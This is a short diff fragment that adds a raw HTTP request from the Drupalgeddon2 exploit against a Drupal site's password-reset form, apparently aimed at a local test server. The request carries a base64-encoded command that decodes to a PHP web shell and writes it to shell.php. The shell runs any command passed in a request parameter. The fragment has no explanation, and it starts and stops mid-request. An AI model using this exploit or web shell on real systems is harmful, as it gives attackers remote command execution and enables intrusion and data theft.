@@ -1,0 +1,1 @@
+%20|%20tee%20shell.php HTTP / 1.1 User-Agent : drupalgeddon2 Connection : close Host : 127.0.0.1:8888 Content-Length : 47 Content-Type : application/x-www-form-urlencoded form_id=user_pass&_triggering_element_name=name This time the command is: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee
